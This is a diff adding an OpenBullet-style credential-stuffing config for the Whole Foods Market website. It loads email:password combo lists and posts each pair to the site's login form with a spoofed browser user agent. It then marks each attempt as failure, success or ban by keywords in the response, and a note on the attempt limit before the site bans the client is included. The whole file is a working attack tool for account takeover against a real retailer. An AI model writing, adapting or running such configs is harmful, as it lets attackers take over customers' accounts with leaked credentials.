@@ -1,0 +1,40 @@
+[SETTINGS]
+{
+  "Name": "WholeFoods",
+  "SuggestedBots": 5,
+  "LastModified": "2018-09-22T03:55:59.4027538+00:00",
+  "AdditionalInfo": "US Proxys - 10 attempts per until banned by wholefoods ",
+  "Author": "suffocate",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST POST "https://www.wholefoodsmarket.com/user" AutoRedirect=TRUE 
+  CONTENT "name=<USER>&pass=<PASS>&form_build_id=form-kkvZW-ufZL3jyPTi4i6xmGQgBsnUG5yHQtHwfxQ6rXI&form_id=user_login&op=Log+in" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "unrecognized" 
+  KEYCHAIN Success OR 
+    KEY "log-out" 
+    KEY "sign-out" 
+    KEY "" 
+  KEYCHAIN Ban OR 
+    KEY "blocked" 
